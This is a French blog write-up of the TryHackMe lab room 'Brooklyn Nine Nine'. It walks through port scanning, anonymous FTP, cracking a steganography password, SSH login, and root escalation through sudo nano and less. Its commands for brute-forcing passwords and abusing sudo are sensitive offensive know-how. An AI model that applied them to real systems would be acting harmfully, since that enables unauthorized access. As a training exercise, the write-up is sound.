---
title: "Write-up | Brooklyn Nine Nine"
date: 2020-07-26T21:05:04+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Ce write-up couvrira la room Brooklyn Nine Nine, disponible sur [Try Hack Me](https://www.tryhackme.com). Let's go !

## Reconnaissance

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.37.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Il y a un service web, et il est possible de se connecter en FTP avec les creds de base.
J'utilise ensuite `gobuster` afin de voir si il y a des folders cachés sur le serveur.
```
$ gobuster dir -u 10.10.223.156 -w /usr/share/wordlists/dirb/big.txt 
...
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/server-status (Status: 403)
...

```
Rien de bien fou par ici. Je regarde le code source de la page et vois le commentaire suivant :
```html
<!-- Have you ever heard of steganography? -->
```
La page d'accueil est composée d'une seule image, que je récupère.
```
$ steghide info brooklyn99.jpg 
"brooklyn99.jpg":
  format: jpeg
  capacit�: 3,5 KB
```
Elle semble contenir des informations, mais je pas le mot de passe pour extraire les données.

## Exploitation
J'utilise `stegcracker` pour tenter de bruteforcer le mot de passe :
```
$ python3 /home/paradox/.local/bin/stegcracker brooklyn99.jpg 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: [edited]
...
```
Je lis ensuite le fichier : 
```
$ cat brooklyn99.jpg.out
Holts Password:
[edited]

Enjoy!!
```
C'est donc le mot de passe de holt qui est dans ce fichier ! J'essaie de me connecter en SSH avec et ça marche !
```
$ cat user.txt 
[edited]
```
Nous voilà en possession du premier flag !

## Élévation de privilèges
```
$ ls
nano.save  user.txt
```
Il y a un fichier `nano.save` (beurk :p), mais nous n'avons pas les droits pour l'ouvrir. Cependant, `nano` peut être utilisé par holt sans mot de passe !
```
$ sudo -l
...
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```
Avec `sudo nano nano.save`, il est possible de lire le contenu du fichier.
Mais bon, on ne va pas s'engager dans cette voie, pour des raisons évidentes :)

En effet, si il est possible d'utiliser `nano` en tant que root ans mot de passe, cela veut dire que nous pouvons lire `/root/root.txt` sans mot de passe également !
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: [edited]

Enjoy!!
```
Et voilà ! :^)

## Follow The Path
L'intro de la room nous dit :
> There are two main intended ways to root the box.

Essayons de trouver la seconde !

Je n'ai pas encore exploré la piste du service FTP. Pour rappel, on peut se connecter au service FTP avec les creds de base.
```
$ ftp 10.10.223.156
Connected to 10.10.223.156.
220 (vsFTPd 3.0.3)
Name (10.10.223.156:paradox): anonymous
331 Please specify the password.
Password:
230 Login successful.
```
Il y a un fichier intitulé `note_to_jack.txt` dans le repertoire. Je le récupère :
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.08 secs (1.4554 kB/s)
```
et l'ouvre sur ma machine :
```
$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
À mon avis, il faut utiliser `hydra` pour bruteforcer le mot de passe SSH de Jake.

Après pas mal de temps, on finit par trouver le mot de passe de Jack, (il est dans `rockyou.txt`).

Une fois connecté en SSH, on voit grâce à `sudo -l` que `less` est utilisable as root sans password. On applique donc la même technique qu'avant, et on peut lire le flag root !
